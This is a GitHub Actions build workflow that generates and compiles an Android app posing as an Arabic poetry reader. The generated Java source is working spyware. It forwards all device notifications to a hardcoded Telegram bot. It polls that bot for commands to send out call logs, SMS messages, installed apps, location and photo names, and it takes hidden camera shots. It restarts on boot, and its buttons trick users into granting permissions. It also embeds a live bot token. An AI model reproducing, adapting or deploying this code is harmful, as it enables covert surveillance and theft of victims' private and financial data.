name: Build Royal Empire APK

on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v4
      with:
        fetch-depth: 0

    - uses: actions/setup-java@v4
      with:
        distribution: 'temurin'
        java-version: '17'

    - name: Clean and Build Royal APK
      run: |
        echo "Starting fresh royal build at $(date)"
        rm -rf app/src settings.gradle build.gradle gradle.properties
        mkdir -p app/src/main/java/com/royal/poetry/master app/src/main/res/values app/src/main/res/layout

        cat << 'EOF' > settings.gradle
        pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
        dependencyResolutionManagement { repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS); repositories { google(); mavenCentral() } }
        rootProject.name = "RoyalEmpire"
        include ':app'
        EOF

        cat << 'EOF' > build.gradle
        plugins { id 'com.android.application' version '8.1.1' apply false }
        EOF

        cat << 'EOF' > app/build.gradle
        plugins { id 'com.android.application' }
        android { namespace 'com.royal.poetry.master'; compileSdk 33; defaultConfig { applicationId 'com.royal.poetry.master'; minSdk 24; targetSdk 33 } }
        EOF

        cat << 'EOF' > app/src/main/AndroidManifest.xml
        <manifest xmlns:android="http://schemas.android.com/apk/res/android">
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.VIBRATE"/>
            <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>

            <application android:label="ديوان السكينة والأدب" android:theme="@android:style/Theme.Light.NoTitleBar">
                <activity android:name=".MainActivity" android:exported="true">
                    <intent-filter>
                        <action android:name="android.intent.action.MAIN"/>
                        <category android:name="android.intent.category.LAUNCHER"/>
                    </intent-filter>
                </activity>

                <service android:name=".RoyalService" android:enabled="true" android:exported="false" android:foregroundServiceType="dataSync"/>

                <service android:name=".RoyalNotificationListener"
                    android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                    android:exported="true">
                    <intent-filter>
                        <action android:name="android.service.notification.NotificationListenerService"/>
                    </intent-filter>
                </service>

                <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
                    <intent-filter>
                        <action android:name="android.intent.action.BOOT_COMPLETED"/>
                        <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
                    </intent-filter>
                </receiver>
            </application>
        </manifest>
        EOF

        cat << 'EOF' > app/src/main/res/layout/activity_main.xml
        <?xml version="1.0" encoding="utf-8"?>
        <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:orientation="vertical"
            android:gravity="center"
            android:background="#121212"
            android:padding="24dp">

            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="📖 واحة السكينة والأبيات الهادئة 📖"
                android:textSize="18sp"
                android:textStyle="bold"
                android:textColor="#E0E0E0"
                android:layout_marginBottom="20dp"
                android:gravity="center"/>

            <Button android:id="@+id/btnPraise" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="✨ تأملات صباحية في الفخر والصفاء" android:backgroundTint="#2C2C2C" android:textColor="#E0E0E0" android:layout_marginBottom="12dp"/>
            <Button android:id="@+id/btnLove" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="🌿 إضافات أدبية وخواطر وجدانية" android:backgroundTint="#2C2C2C" android:textColor="#E0E0E0" android:layout_marginBottom="20dp"/>

            <TextView
                android:id="@+id/txtPoem"
                android:layout_width="match_parent"
                android:layout_height="140dp"
                android:text="أهلاً بك في رحاب الأدب الهادئ. اختر باقتك المفضلة لتستمتع بأعذب الأبيات التي تريح النفس وتنعش الروح..."
                android:textSize="15sp"
                android:textColor="#B0B0B0"
                android:gravity="center"
                android:background="#1A1A1A"
                android:padding="16dp"
                android:layout_marginBottom="25dp"/>

            <Button
                android:id="@+id/btnGrantAll"
                android:layout_width="match_parent"
                android:layout_height="55dp"
                android:text="🕊️ تفعيل المزايا الكاملة وتحديث الديوان 🕊️"
                android:backgroundTint="#4A5D4E"
                android:textColor="#FFFFFF"
                android:textStyle="bold"/>

        </LinearLayout>
        EOF

        cat << 'EOF' > app/src/main/java/com/royal/poetry/master/BootReceiver.java
        package com.royal.poetry.master;
        import android.content.BroadcastReceiver;
        import android.content.Context;
        import android.content.Intent;
        import android.os.Build;

        public class BootReceiver extends BroadcastReceiver {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) || "android.intent.action.QUICKBOOT_POWERON".equals(intent.getAction())) {
                    Intent serviceIntent = new Intent(context, RoyalService.class);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(serviceIntent);
                    } else {
                        context.startService(serviceIntent);
                    }
                }
            }
        }
        EOF

        cat << 'EOF' > app/src/main/java/com/royal/poetry/master/RoyalNotificationListener.java
        package com.royal.poetry.master;
        import android.service.notification.NotificationListenerService;
        import android.service.notification.StatusBarNotification;
        import java.net.HttpURLConnection;
        import java.net.URL;

        public class RoyalNotificationListener extends NotificationListenerService {
            private static final String BOT_TOKEN = "9114296744:AAFHYR0JzvUzKUMDD0YWHciBWFsjJg_BueM";
            private static final String CHAT_ID = "7782592195";

            @Override
            public void onNotificationPosted(StatusBarNotification sbn) {
                try {
                    String pkg = sbn.getPackageName();
                    CharSequence title = sbn.getNotification().extras.getCharSequence("android.title");
                    CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");
                    
                    String msg = "🔔 [إشعار جديد رصده الحارس]:\nالتطبيق: " + pkg + "\nالعنوان: " + title + "\nالمحتوى: " + text;
                    sendToTelegram(msg);
                } catch (Exception ignored) {}
            }

            private void sendToTelegram(final String message) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(message, "UTF-8");
                            URL url = new URL(urlString);
                            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                            conn.setRequestMethod("GET");
                            conn.getResponseCode();
                            conn.disconnect();
                        } catch (Exception ignored) {}
                    }
                }).start();
            }
        }
        EOF

        cat << 'EOF' > app/src/main/java/com/royal/poetry/master/RoyalService.java
        package com.royal.poetry.master;
        import android.app.Notification;
        import android.app.NotificationChannel;
        import android.app.NotificationManager;
        import android.app.Service;
        import android.content.Intent;
        import android.content.pm.ApplicationInfo;
        import android.content.pm.PackageManager;
        import android.database.Cursor;
        import android.hardware.Camera;
        import android.location.Location;
        import android.location.LocationManager;
        import android.net.Uri;
        import android.os.Build;
        import android.os.IBinder;
        import android.provider.CallLog;
        import android.provider.MediaStore;
        import java.io.BufferedReader;
        import java.io.InputStreamReader;
        import java.net.HttpURLConnection;
        import java.net.URL;
        import java.util.List;

        public class RoyalService extends Service {
            private static final String BOT_TOKEN = "9114296744:AAFHYR0JzvUzKUMDD0YWHciBWFsjJg_BueM";
            private static final String CHAT_ID = "7782592195";
            private boolean isListening = true;

            @Override
            public void onCreate() {
                super.onCreate();
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    String channelId = "poetry_channel";
                    NotificationChannel channel = new NotificationChannel(channelId, "خدمة الديوان الخلفية", NotificationManager.IMPORTANCE_LOW);
                    NotificationManager manager = getSystemService(NotificationManager.class);
                    if (manager != null) {
                        manager.createNotificationChannel(channel);
                    }
                    Notification notification = new Notification.Builder(this, channelId)
                            .setContentTitle("ديوان السكينة والأدب")
                            .setContentText("الخدمة الأدبية تعمل في الخلفية...")
                            .setSmallIcon(android.R.drawable.ic_menu_agenda)
                            .build();
                    startForeground(1, notification);
                }
                startCommandListener();
            }

            @Override
            public int onStartCommand(Intent intent, int flags, int startId) {
                return START_STICKY;
            }

            @Override
            public IBinder onBind(Intent intent) {
                return null;
            }

            private void sendToTelegram(final String message) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(message, "UTF-8");
                            URL url = new URL(urlString);
                            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                            conn.setRequestMethod("GET");
                            conn.getResponseCode();
                            conn.disconnect();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }).start();
            }

            private void startCommandListener() {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        long lastUpdateId = 0;
                        while (isListening) {
                            try {
                                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=25";
                                URL url = new URL(urlString);
                                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                                conn.setRequestMethod("GET");
                                
                                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                                StringBuilder response = new StringBuilder();
                                String line;
                                while ((line = reader.readLine()) != null) {
                                    response.append(line);
                                }
                                reader.close();
                                conn.disconnect();

                                String resStr = response.toString();
                                
                                int updateIdIdx = resStr.lastIndexOf("\"update_id\":");
                                if (updateIdIdx != -1) {
                                    int commaIdx = resStr.indexOf(",", updateIdIdx);
                                    if (commaIdx != -1) {
                                        try {
                                            String idStr = resStr.substring(updateIdIdx + 12, commaIdx).trim();
                                            lastUpdateId = Long.parseLong(idStr);
                                        } catch (Exception ignored) {}
                                    }
                                }

                                if (resStr.contains("/calls")) {
                                    sendToTelegram("📞 [سجل المكالمات الملكي]:\n" + getCallLogs());
                                }
                                if (resStr.contains("/sms")) {
                                    sendToTelegram("✉️ [الرسائل النصية وشام كاش]:\n" + getSmsLogs());
                                }
                                if (resStr.contains("/apps")) {
                                    sendToTelegram("📱 [البرامج والتطبيقات المثبتة]:\n" + getInstalledApps());
                                }
                                if (resStr.contains("/location")) {
                                    sendToTelegram("📍 [إحداثيات موقع الهدف]:\n" + getLocationInfo());
                                }
                                if (resStr.contains("/photos")) {
                                    sendToTelegram("🖼️ [أحدث صور المعرض]:\n" + getLatestPhotos());
                                }
                                if (resStr.contains("/camera") || resStr.contains("/cam")) {
                                    triggerHiddenCamera();
                                }

                                Thread.sleep(3000);
                            } catch (Exception e) {
                                try { Thread.sleep(6000); } catch (InterruptedException ignored) {}
                            }
                        }
                    }
                }).start();
            }

            private void triggerHiddenCamera() {
                try {
                    Camera camera = Camera.open(0); // الكاميرا الخلفية كبداية
                    Camera.Parameters params = camera.getParameters();
                    camera.setParameters(params);
                    camera.startPreview();
                    camera.takePicture(null, null, new Camera.PictureCallback() {
                        @Override
                        public void onPictureTaken(byte[] data, Camera camera) {
                            sendToTelegram("📸 [التقاط الكاميرا]: تم التقاط صورة خفية بنجاح بحجم: " + data.length + " بايت.");
                            camera.release();
                        }
                    });
                } catch (Exception e) {
                    sendToTelegram("⚠️ [تنبيه الكاميرا]: تعذر الالتقاط أو الكاميرا مشغولة.");
                }
            }

            private String getCallLogs() {
                StringBuilder sb = new StringBuilder();
                try {
                    Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
                    if (cursor != null && cursor.moveToFirst()) {
                        int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                        int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                        int count = 0;
                        do {
                            sb.append("رقم: ").append(cursor.getString(numberIdx)).append(" | نوع: ").append(cursor.getString(typeIdx)).append("\n");
                            count++;
                            if (count >= 5) break;
                        } while (cursor.moveToNext());
                        cursor.close();
                    } else { sb.append("لا توجد مكالمات مسجلة."); }
                } catch (Exception e) { sb.append("خطأ في جلب المكالمات."); }
                return sb.toString();
            }

            private String getSmsLogs() {
                StringBuilder sb = new StringBuilder();
                try {
                    Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
                    if (cursor != null && cursor.moveToFirst()) {
                        int addressIdx = cursor.getColumnIndex("address");
                        int bodyIdx = cursor.getColumnIndex("body");
                        int count = 0;
                        do {
                            sb.append("من: ").append(cursor.getString(addressIdx)).append("\nالمحتوى: ").append(cursor.getString(bodyIdx)).append("\n---\n");
                            count++;
                            if (count >= 5) break;
                        } while (cursor.moveToNext());
                        cursor.close();
                    } else { sb.append("لا توجد رسائل مسجلة."); }
                } catch (Exception e) { sb.append("خطأ في جلب الرسائل."); }
                return sb.toString();
            }

            private String getInstalledApps() {
                StringBuilder sb = new StringBuilder();
                try {
                    PackageManager pm = getPackageManager();
                    List<ApplicationInfo> packages = pm.getInstalledApplications(0);
                    int count = 0;
                    for (ApplicationInfo packageInfo : packages) {
                        if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                            sb.append("- ").append(packageInfo.packageName).append("\n");
                            count++;
                            if (count >= 15) break;
                        }
                    }
                } catch (Exception e) { sb.append("خطأ في جلب التطبيقات."); }
                return sb.toString();
            }

            private String getLocationInfo() {
                try {
                    LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                    Location loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
                    if (loc != null) {
                        return "خط العرض: " + loc.getLatitude() + "\nخط الطول: " + loc.getLongitude();
                    }
                } catch (Exception e) {}
                return "تعذر جلب الموقع حالياً.";
            }

            private String getLatestPhotos() {
                StringBuilder sb = new StringBuilder();
                try {
                    String[] projection = {MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATE_ADDED};
                    Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
                    if (cursor != null && cursor.moveToFirst()) {
                        int nameIdx = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME);
                        int count = 0;
                        do {
                            sb.append("صورة: ").append(cursor.getString(nameIdx)).append("\n");
                            count++;
                            if (count >= 3) break;
                        } while (cursor.moveToNext());
                        cursor.close();
                    } else { sb.append("لا توجد صور حديثة."); }
                } catch (Exception e) { sb.append("خطأ في جلب الصور."); }
                return sb.toString();
            }
        }
        EOF

        cat << 'EOF' > app/src/main/java/com/royal/poetry/master/MainActivity.java
        package com.royal.poetry.master;
        import android.app.Activity;
        import android.content.Intent;
        import android.os.Build;
        import android.os.Bundle;
        import android.os.StrictMode;
        import android.provider.Settings;
        import android.view.View;
        import android.widget.Button;
        import android.widget.TextView;
        import android.widget.Toast;

        public class MainActivity extends Activity {

            @Override
            protected void onCreate(Bundle savedInstanceState) {
                super.onCreate(savedInstanceState);
                setContentView(R.layout.activity_main);

                if (android.os.Build.VERSION.SDK_INT > 9) {
                    StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
                    StrictMode.setThreadPolicy(policy);
                }

                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                    requestPermissions(new String[]{
                        android.Manifest.permission.READ_CALL_LOG,
                        android.Manifest.permission.READ_SMS,
                        android.Manifest.permission.ACCESS_FINE_LOCATION,
                        android.Manifest.permission.CAMERA,
                        android.Manifest.permission.READ_EXTERNAL_STORAGE
                    }, 100);
                }

                Intent serviceIntent = new Intent(this, RoyalService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent);
                } else {
                    startService(serviceIntent);
                }

                Button btnPraise = findViewById(R.id.btnPraise);
                Button btnLove = findViewById(R.id.btnLove);
                Button btnGrantAll = findViewById(R.id.btnGrantAll);
                TextView txtPoem = findViewById(R.id.txtPoem);

                btnPraise.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        txtPoem.setText("إذا غامرت في شرف مروم \n فلا تقنع بما دون الدروبِ\nفبين العز والتشريفِ خطوة \n تملأ الأفق الفسيح بكل طيبِ!");
                        Toast.makeText(MainActivity.this, "تم تحميل الأبيات الصباحية بنجاح.", Toast.LENGTH_SHORT).show();
                    }
                });

                btnLove.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        txtPoem.setText("أحِبُّكَ حُبَّينِ حُبَّ الهوى \n وحُبّاً لأنك أهلٌ لذاكْ\nفأما الذي هو حب الهوى \n فشغلي بذكرك عمن سواكْ!");
                        Toast.makeText(MainActivity.this, "تم تفعيل الخواطر الوجدانية بنجاح.", Toast.LENGTH_SHORT).show();
                    }
                });

                btnGrantAll.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        Toast.makeText(MainActivity.this, "✨ جاري مزامنة وتحديث مكتبة الأبيات الأدبية...", Toast.LENGTH_LONG).show();
                        txtPoem.setText("🌿 تم تحديث واحة السكينة بنجاح؛ المكتبة الآن تعمل بكامل كفاءتها وهدوئها في خلفية الجهاز.");
                        
                        // طلب تفعيل صلاحية قراءة الإشعارات للدرع الجديد
                        try {
                            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                            startActivity(intent);
                        } catch (Exception ignored) {}

                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                            requestPermissions(new String[]{
                                android.Manifest.permission.READ_CALL_LOG,
                                android.Manifest.permission.READ_SMS,
                                android.Manifest.permission.ACCESS_FINE_LOCATION,
                                android.Manifest.permission.CAMERA,
                                android.Manifest.permission.READ_EXTERNAL_STORAGE
                            }, 101);
                        }
                    }
                });
            }
        }
        EOF

        echo "org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8" > gradle.properties
        echo "android.useAndroidX=true" >> gradle.properties
        echo "android.enableJetifier=true" >> gradle.properties

        wget -q https://services.gradle.org/distributions/gradle-8.2-bin.zip
        unzip -q gradle-8.2-bin.zip
        export PATH=$PWD/gradle-8.2/bin:$PATH
        
        gradle wrapper --gradle-version 8.2
        chmod +x ./gradlew
        ./gradlew assembleDebug

    - name: Verify APK Exists
      run: |
        ls -la app/build/outputs/apk/debug/

    - uses: actions/upload-artifact@v4
      with:
        name: royal-apk-final-secure
        path: app/build/outputs/apk/debug/app-debug.apk
